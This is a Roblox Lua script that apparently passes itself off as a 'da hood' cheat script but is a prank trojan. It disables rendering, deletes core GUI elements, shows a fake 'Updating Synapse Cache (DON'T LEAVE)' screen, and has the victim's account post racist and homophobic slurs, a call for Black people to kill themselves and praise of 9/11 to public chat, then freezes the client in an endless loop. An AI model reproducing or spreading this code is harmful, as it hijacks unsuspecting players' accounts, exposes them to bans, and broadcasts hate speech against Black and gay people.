                local say = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
                game:GetService("RunService"):Set3dRenderingEnabled(false)

                for _,v in pairs(game:GetService("CoreGui"):GetChildren()) do
                    v:Destroy()
                end

                -- Gui to Lua
                -- Version: 3.2

                -- Instances:

                local ScreenGui = Instance.new("ScreenGui")
                local Frame = Instance.new("Frame")
                local TextLabel = Instance.new("TextLabel")
                local TextLabel_2 = Instance.new("TextLabel")

                --Properties:

                ScreenGui.Parent = game:GetService("CoreGui")
                ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                ScreenGui.ResetOnSpawn = false
                ScreenGui.IgnoreGuiInset = true

                Frame.Parent = ScreenGui
                Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
                Frame.Size = UDim2.new(1, 0, 1, 0)

                TextLabel.Parent = Frame
                TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
                TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                TextLabel.BackgroundTransparency = 1.000
                TextLabel.Position = UDim2.new(0.5, 0, 0.449999988, 0)
                TextLabel.Size = UDim2.new(0, 1037, 0, 53)
                TextLabel.Font = Enum.Font.GothamBold
                TextLabel.Text = "Updating Synapse Cache"
                TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                TextLabel.TextScaled = true
                TextLabel.TextSize = 14.000
                TextLabel.TextWrapped = true

                TextLabel_2.Parent = Frame
                TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
                TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                TextLabel_2.BackgroundTransparency = 1.000
                TextLabel_2.Position = UDim2.new(0.5, 0, 0.50999999, 0)
                TextLabel_2.Size = UDim2.new(0, 1037, 0, 44)
                TextLabel_2.Font = Enum.Font.Gotham
                TextLabel_2.Text = "(DON'T LEAVE)"
                TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
                TextLabel_2.TextScaled = true
                TextLabel_2.TextSize = 14.000
                TextLabel_2.TextWrapped = true

                say:FireServer("Shouldn't have used that da hood script!","All")
                wait(1)
                for i=1,2 do
                    say:FireServer("Nigger Ass Bitch","All")
                    wait(2)
                end

                for i=1,2 do
                    say:FireServer("Fuck all gay people","All")
                    wait(2)
                end

                for i=1,2 do
                    say:FireServer("Niggers should kill themselves","All")
                    wait(2)
                end

                for i=1,3 do
                    say:FireServer("9/11 was a good thing faggot","All")
                    wait(0.2)
                end

                wait(0.5)
                TextLabel.Text = "You may now rejoin."
                wait(1)
                repeat until nil
